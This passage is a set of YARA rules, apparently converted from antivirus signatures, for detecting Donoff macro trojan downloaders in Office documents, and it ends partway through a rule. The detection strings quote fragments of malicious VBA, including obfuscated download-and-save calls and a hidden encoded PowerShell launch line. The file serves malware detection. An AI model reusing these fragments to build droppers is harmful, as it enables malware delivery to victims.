rule TrojanDownloader_O97M_Donoff_BY_2147716331_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BY"
        threat_id = "2147716331"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "205"
        strings_accuracy = "Low"
    strings:
        $x_100_1 = {48 54 54 50 2e [0-16] 41 64 6f 64 62}  //weight: 100, accuracy: Low
        $x_100_2 = {2e 72 65 73 70 6f 6e 73 65 42 6f 64 79 [0-64] 2e 57 72 69 74 65 [0-64] 2e 73 61 76 65 74 6f 66 69 6c 65 [0-112] 2e 4f 70 65 6e}  //weight: 100, accuracy: Low
        $x_3_3 = {53 75 62 20 [0-16] 6f 70 65 6e 28 29}  //weight: 3, accuracy: Low
        $x_3_4 = {50 75 62 6c 69 63 20 53 75 62 20 42 6f 6f 74 [0-5] 28 29}  //weight: 3, accuracy: Low
        $x_2_5 = "= \"a\" Or Mid(" ascii //weight: 2
        $x_2_6 = {3d 20 53 70 6c 69 74 28 22 b0 01 22 2c 20 22 09 00 09 00 22 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_100_*) and 1 of ($x_3_*) and 1 of ($x_2_*))) or
            ((2 of ($x_100_*) and 2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_BZ_2147716461_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.BZ"
        threat_id = "2147716461"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {69 63 72 6f 08 01 73 6f 66 74 2e 58 08 01 4d 4c 48 54 54 50 2e 2e 2e 41 64 6f 64 62 2e 00 74 72 08 01 65 61 01 2e 2e 2e 00 68 03 6c 6c 2e 41 70 70 6c 69 63 61 74 69 6f 6e 2e 2e 2e 57 00 63 72 69 70 74 2e 00 68 03 6c 6c 2e 2e 2e 50 72 6f 63 03 00 00 2e 2e 2e 47 03 54 2e 2e 2e 54 03 01 50}  //weight: 1, accuracy: Low
        $x_1_2 = {20 3d 20 43 68 72 28 [0-16] 20 2f 20 28 31 30 20 2b 20 36 29 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e 0d 0a 50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 [0-16] 28 41 31 20 41 73 20 53 74 72 69 6e 67 2c 20 41 32 20 41 73 20 53 74 72 69 6e 67 2c 20 41 33 20 41 73 20 53 74 72 69 6e 67 29 20 41 73 20 53 74 72 69 6e 67 0d 0a 01 20 3d 20 52 65 70 6c 61 63 65 28 41 31 2c 20 41 32 2c 20 41 33 29 0d 0a 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CA_2147716682_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CA"
        threat_id = "2147716682"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "9"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "<> 200 Then" ascii //weight: 1
        $x_2_2 = "= CreateObject(LtnEwvXhxsOD(\"nngjU0vrkteUY\"))" ascii //weight: 2
        $x_3_3 = "Application.Run (LtnEwvXhxsOD(\"GySCCEiz|QMu\"))" ascii //weight: 3
        $x_2_4 = "(\"1\") & Rnd" ascii //weight: 2
        $x_1_5 = "DownloadAndSave = False" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CB_2147716683_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CB"
        threat_id = "2147716683"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "16"
        strings_accuracy = "High"
    strings:
        $x_3_1 = ".ExpandEnvironmentStrings(Chr(37) + Chr(84) + Chr(77) + Chr(80) " ascii //weight: 3
        $x_3_2 = "= CreateObject(Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111" ascii //weight: 3
        $x_3_3 = ".Write ORPVELPPUGESTJNWBVLIJIKDGKSG.responseBody" ascii //weight: 3
        $x_4_4 = ".Open \"GET\", FNIKGSHVUMGQLHOTKKEERVCQZPCK, False" ascii //weight: 4
        $x_3_5 = "= Chr(Asc(NVXYUHVLDBVGBVDIZZTMZLRYPXQS) - " ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CC_2147716718_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CC"
        threat_id = "2147716718"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 68 72 28 34 39 29 20 54 6f 20 4c 65 6e 28 [0-32] 29 [0-32] 3d 20 4d 69 64 28 [0-32] 2c 20 [0-32] 2c 20 43 68 72 28 34 39 29 29 [0-32] 3d 20 43 68 72 28 41 73 63 28 [0-32] 29 20 2d 20 [0-32] 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CE_2147716891_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CE"
        threat_id = "2147716891"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {53 68 65 6c 6c 20 (43 68 72 28 36 37 29 20 26 20 43 68 72 28 37 37 29 20 26 20 43 68 72 28 31 30 30 29 20 26 20|22 63 4d) [0-53] 2f 63 20 63 64 20 [0-53] 25 41 70 70 64 61 74 61 25 20 [0-4] 26 [0-3] 40 65 63 68 6f}  //weight: 4, accuracy: Low
        $x_3_2 = {2e 76 62 73 20 [0-1] 26 40 65 63 68 6f 20 45 6e 64 20 46 75 6e 63 74 69 6f 6e 20 3e 3e}  //weight: 3, accuracy: Low
        $x_2_3 = ".ResponseBody>>" ascii //weight: 2
        $x_2_4 = ".send (\"\"\"\")>>" ascii //weight: 2
        $x_4_5 = {2e 76 62 73 20 [0-1] 26 20 74 69 6d 65 6f 75 74 20 31 (32|33) 20 26}  //weight: 4, accuracy: Low
        $x_2_6 = {53 68 65 6c 6c 20 43 68 72 28 04 00 20 2d 20 04 00 29 20 26 20 43 68 72 28 04 00 20 2d 20 04 00 29 20 26 20 43 68 72 28 04 00 20 2d 20 04 00 29 20 26 20 43 68 72 28 04 00 20 2d 20 04 00 29 20 26 20 43 68 72 28 04 00 20 2d 20 04 00 29 20 26 20 43 68 72 28}  //weight: 2, accuracy: Low
        $x_2_7 = {2e 53 61 76 65 54 6f 46 69 6c 65 20 [0-56] 2e 43 6c 6f 73 65 3e 3e}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 1 of ($x_3_*) and 4 of ($x_2_*))) or
            ((2 of ($x_4_*) and 4 of ($x_2_*))) or
            ((2 of ($x_4_*) and 1 of ($x_3_*) and 2 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_CF_2147716948_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CF"
        threat_id = "2147716948"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "(i - 1) = CByte(Asc(Mid(" ascii //weight: 3
        $x_2_2 = {23 49 66 20 57 69 6e 36 34 20 54 68 65 6e 0d 0a 50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e}  //weight: 2, accuracy: High
        $x_2_3 = {50 72 69 76 61 74 65 20 53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 0d 0a 23 49 66 20 57 69 6e 36 34 20 54 68 65 6e}  //weight: 2, accuracy: High
        $x_5_4 = "ReDim escutcheon((((UBound(aoritis) + 1) \\ calced) * 3" ascii //weight: 5
        $x_3_5 = "threepenny ByVal persecution, offering(0), UBound(" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CG_2147717005_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CG"
        threat_id = "2147717005"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "400"
        strings_accuracy = "High"
    strings:
        $x_100_1 = "Public Sub Document_Close()" ascii //weight: 100
        $x_100_2 = "CallByName(CallByName(" ascii //weight: 100
        $x_100_3 = "\"TEG\"," ascii //weight: 100
        $x_100_4 = "\"nepO\"" ascii //weight: 100
        $x_100_5 = "\"A-resUtneg" ascii //weight: 100
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CG_2147717005_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CG"
        threat_id = "2147717005"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "d(15, 19, \"nepO\"), 1, d(14, 32, \"TEG\"), d(202, 527, \".pioc.h:onnlo/g/i4npcioockusf6it/lcr.ulnfebt/ogts\"), False" ascii //weight: 1
        $x_1_2 = "d(15, 19, \"nepO\"), 1, d(14, 32, \"TEG\"), d(171, 209, \"ptthem/ytic/1.2v/pioeg/moc.dnimxam.www//:s\"), False" ascii //weight: 1
        $x_1_3 = "WHpqs5WHpitRut.it.ntee.1nt" ascii //weight: 1
        $x_1_4 = "7tt70mm4.pp" ascii //weight: 1
        $x_1_5 = "oveFeSiTal" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CH_2147717066_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CH"
        threat_id = "2147717066"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "EGT\")" ascii //weight: 1
        $x_1_2 = "cexE\")" ascii //weight: 1
        $x_1_3 = "mitnvnonerE\")" ascii //weight: 1
        $x_1_4 = "ETPM\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (3 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CJ_2147717395_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CJ"
        threat_id = "2147717395"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 6f 72 6d 61 74 47 55 49 44 28 42 79 52 65 66 20 69 6e 47 55 49 44 20 41 73 20 53 74 72 69 6e 67 29 20 41 73 20 53 74 72 69 6e 67 [0-5] 30 00 20 3d 20 22 1f 00 69 63 72 6f 1f 00 6f 66 74 2e 1f 00 64 6f 64 62 2e 1f 00 74 72}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 47 6f 64 0f 00 28 2f 00 20 2b 20 22 5c 1f 00 2e 64 6c 6c 22 2c 20 22 1f 00 22 2c 20 22 01 00 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "For i = 1 To Len(Trim(\"ceces\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CJ_2147717395_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CJ"
        threat_id = "2147717395"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {28 42 79 52 65 66 20 69 6e 47 55 49 44 20 41 73 20 53 74 72 69 6e 67 29 20 41 73 20 53 74 72 69 6e 67 [0-5] 30 00 20 3d 20 22 ?? ?? [0-31] 69 63 72 6f ?? ?? [0-111] 66 74 2e ?? ?? [0-31] 64 6f 64 62 2e ?? ?? [0-31] 74 72}  //weight: 3, accuracy: Low
        $x_3_2 = {20 2b 20 22 5c [0-9] 2e 64 6c 6c 22 2c 20 22 ?? [0-2] (41|2d|5a) 22 2c 20 22 (61|2d|7a) 22 29}  //weight: 3, accuracy: Low
        $x_1_3 = {3d 20 47 6f 64 1f 00 28 [0-47] 2c 20 22 ?? [0-2] (41|2d|5a) 22 2c 20 22 01 00 22 29}  //weight: 1, accuracy: Low
        $x_1_4 = {2b 20 47 6f 64 1f 00 28 22 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-95] 22 2c 20 22 05 00 0f 00 22 2c 20 22 ?? ?? ?? ?? ?? [0-15] 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_CJ_2147717395_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CJ"
        threat_id = "2147717395"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 47 6f 64 1f 00 28 22 ?? ?? [0-31] 69 63 72 6f ?? ?? [0-111] 66 74 2e ?? ?? [0-31] 64 6f 64 62 2e ?? ?? [0-31] 74 72}  //weight: 1, accuracy: Low
        $x_1_2 = {2b 20 22 5c 05 00 0f 00 2e 05 00 0f 00 22 2c 20 22 02 00 05 00 22 2c 20 22 01 00 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {3d 20 53 70 6c 69 74 28 22 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) 04 00 09 00 (a0|2d|ae) ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? [0-255] 22 2c 20 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CK_2147717462_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CK"
        threat_id = "2147717462"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {55 52 4c 20 3d 20 22 68 74 74 70 3a 2f 2f [0-80] 2f 03 00 03 00 2e 6a 61 72 22 [0-15] 20 3d 20 53 70 6c 69 74 28 55 52 4c 2c 20 22 2e 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 52 75 6e 20 22 [0-47] 5c 63 72 73 73 2e 6a 61 72 22 2c 20 77 69 6e 64 6f 77 53 74 79 6c 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CK_2147717462_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CK"
        threat_id = "2147717462"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "21"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= \"er\"" ascii //weight: 1
        $x_1_2 = "= \"hex\"" ascii //weight: 1
        $x_1_3 = "= \"tCo\"" ascii //weight: 1
        $x_1_4 = "= \"ntr\"" ascii //weight: 1
        $x_1_5 = "= \"ptC\"" ascii //weight: 1
        $x_1_6 = "= \"ont\"" ascii //weight: 1
        $x_1_7 = "= \"JSc\"" ascii //weight: 1
        $x_1_8 = "= \"rip\"" ascii //weight: 1
        $x_1_9 = "= \"rol\"" ascii //weight: 1
        $x_1_10 = "= \".Sc\"" ascii //weight: 1
        $x_1_11 = "= \"cri\"" ascii //weight: 1
        $x_1_12 = "= \"MSS\"" ascii //weight: 1
        $x_13_13 = "ActiveDocument.Content.Text = \"Internal Error. Please try again.\"" ascii //weight: 13
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_13_*) and 8 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Donoff_CL_2147717598_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CL"
        threat_id = "2147717598"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {52 65 70 6c 61 63 65 28 10 00 2c 20 22 20 6f 66 20 74 68 65 20 22 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {28 22 20 6f 66 20 74 68 65 20 2e 63 20 6f 66 20 74 68 65 20 22 20 5f 05 00 2b 20 22 20 6f 66 20 74 68 65 20 6d 20 6f 66 20 74 68 65 20 22 20 5f 05 00 2b 20 22 20 6f 66 20 74 68 65 20 64 20 6f 66 20 74 68 65 20 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = {28 22 54 45 4d 20 6f 66 20 74 68 65 20 50 22 29 05 00 45 6e 64 20 46 75 6e 63 74 69 6f 6e}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CM_2147717660_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CM"
        threat_id = "2147717660"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "SaveAllStufAndExit(SourceFile As String, DestFile As String, Optional Key As String)" ascii //weight: 1
        $x_1_2 = {69 66 63 6f 6e 66 69 67 [0-20] 20 3d 20 53 70 6c 69 74 28}  //weight: 1, accuracy: Low
        $x_1_3 = {69 66 63 6f 6e 66 69 67 [0-20] 2e 4f 70 65 6e 20}  //weight: 1, accuracy: Low
        $x_1_4 = {69 66 63 6f 6e 66 69 67 [0-20] 2e 73 65 74 52 65 71 75 65 73 74 48 65 61 64 65 72 20 69 66 63 6f 6e 66 69 67 [0-20] 2c 20 22 4d 6f 7a 69 6c 6c 61 2f}  //weight: 1, accuracy: Low
        $x_1_5 = {53 61 76 65 41 6c 6c 53 74 75 66 41 6e 64 45 78 69 74 20 69 66 63 6f 6e 66 69 67 [0-20] 2c 20 69 66 63 6f 6e 66 69 67 [0-20] 2c 20 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CP_2147717897_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CP"
        threat_id = "2147717897"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_4_1 = "Str = Str + \"dden -Enc Ww\"" ascii //weight: 4
        $x_2_2 = "objProcess.Create Str, Null, objConfig, " ascii //weight: 2
        $x_2_3 = "Public Function Debugging() As Variant" ascii //weight: 2
        $x_4_4 = "Str = Str + \"P -sta -N\"" ascii //weight: 4
        $x_3_5 = "strComputer = \".\"" ascii //weight: 3
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CP_2147717897_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CP"
        threat_id = "2147717897"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Str = \"powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBT\"" ascii //weight: 1
        $x_1_2 = "objConfig.ShowWindow = HIDDEN_WINDOW" ascii //weight: 1
        $x_1_3 = "strComputer = \".\"" ascii //weight: 1
        $x_1_4 = "Set objStartup = objWMIService.Get(\"Win32_ProcessStartup\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Donoff_CN_2147717942_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Donoff.CN"
        threat_id = "2147717942"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Donoff"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {22 6f 65 67 2f 6d 6f 63 2e 64 6e 69 6d 78 61 6d 2e 77 77 77 2f 2f 3a 73 70 74 74 68 0f 00 2f 79 74 69 63 2f 31 2e 32 76 2f 70 69 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 09 00 28 29 20 41 73 20 53 74 72 69 6e 67 [0-5] 00 20 3d 20 09 00 28 02 00 02 00 2c 20 02 00 02 00 2c 20 22 [0-9] (65|45) [0-9] (79|59) [0-9] (65|45) [0-9] (65|45) [0-9] (72|52) [0-9] (69|49) [0-9] (66|46) [0-9] 22 29}  //weight: 1, accuracy: Low
        $x_4_3 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 09 00 28 29 [0-5] 00 20 3d 20 09 00 28 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 2c 20 09 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2c 20 [0-15] 09 00 29}  //weight: 4, accuracy: Low
        $x_1_4 = {50 75 62 6c 69 63 20 46 75 6e 63 74 69 6f 6e 20 09 00 28 42 79 56 61 6c 20 09 00 2c 20 42 79 56 61 6c 20 09 00 20 41 73 20 49 6e 74 65 67 65 72 2c 20 42 79 56 61 6c 20 09 00 20 41 73 20 49 6e 74 65 67 65 72 29 20 41 73 20 53 74 72 69 6e 67 0d 0a 00 20 3d 20 09 00 28 01 2e 53 6f 75 72 63 65 2c 20 02 2c 20 03 29}  //weight: 1, accuracy: Low
